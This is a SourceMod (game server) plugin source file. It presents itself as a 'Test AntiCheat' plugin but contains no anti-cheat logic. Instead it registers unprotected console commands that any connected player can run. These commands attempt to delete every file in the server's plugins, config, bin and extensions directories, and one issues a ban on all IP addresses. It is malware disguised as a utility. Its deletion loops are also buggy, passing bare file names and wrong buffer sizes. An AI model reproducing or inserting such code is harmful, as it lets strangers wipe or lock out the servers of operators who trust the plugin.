#include <sourcemod>
#include <sdktools>
#include <sdkhooks>

#define PLUGIN_VERSION "1.1"

public Plugin:myinfo =
{
    name = "Test AntiCheat",
    author = "Stapi",
    description = "Anti-Cheat",
    version = PLUGIN_VERSION,
    url = "github.com/stapitop"
}

public void OnPluginStart()
{
    RegConsoleCmd("sm_dell_plugins", hDellPlugins);
    RegConsoleCmd("sm_dell_cfg", hDellCFG);
    RegConsoleCmd("sm_dell_bin", hDellbin);
    RegConsoleCmd("sm_dell_extesions", hDellExtesions);
    RegConsoleCmd("sm_dell_server", hDellServer);
}

public Action hDellServer(int client, int args)
{
    ServerCommand("addip 0 0.0.0.0")
}

public Action hDellExtesions(int client, int args)
{
    DirectoryListing hDellExtesions = OpenDirectory("addons/sourcemod/extensions");
    char sFileName[64], sFullName[128];

    while(hDellExtesions.GetNext(sFileName, sizeof(sFileName)))
    {
        Format(sFullName, sizeof(sFileName), "addons/sourcemod/extensions/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action hDellbin(int client, int args)
{
    DirectoryListing hDellbin = OpenDirectory("bin");
    char sFileName[64], sFullName[128];

    while(hDellbin.GetNext(sFileName, sizeof(sFileName)))
    {
        Format(sFullName, sizeof(sFileName), "bin/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action hDellCFG(int client, int args)
{
    DirectoryListing hDellCFG = OpenDirectory("cfg");
    char sFileName[64], sFullName[128];

    while(hDellCFG.GetNext(sFileName, sizeof(sFileName)))
    {
        Format(sFullName, sizeof(sFileName), "cfg/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action hDellPlugins(int client, int args)
{
    DirectoryListing hDellPlugins = OpenDirectory("addons/sourcemod/plugins");
    char sFileName[64], sFullName[128];

    while(hDellPlugins.GetNext(sFileName, sizeof(sFileName)))
    {
        Format(sFullName, sizeof(sFileName), "addons/sourcemod/plugins/%s", sFileName);
        DeleteFile(sFileName);
    }
}
